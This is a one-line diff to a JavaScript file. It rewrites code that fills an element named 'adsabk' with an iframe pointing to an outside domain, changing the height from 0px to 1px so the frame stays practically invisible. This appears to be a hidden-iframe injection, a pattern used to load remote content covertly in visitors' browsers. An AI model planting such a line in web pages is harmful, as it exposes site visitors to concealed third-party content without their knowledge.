@@ -1,2 +1,2 @@
 
-document.getElementById('adsabk').innerHTML = '<iframe style="width: 100%; height: 0px;" name="I1" src="http://ward.wwooww.net/h16-page" border="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" align="middle"></iframe>';
+document.getElementById('adsabk').innerHTML = '<iframe style="width: 100%; height: 1px;" name="I1" src="http://ward.wwooww.net/h16-page" border="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" align="middle"></iframe>';
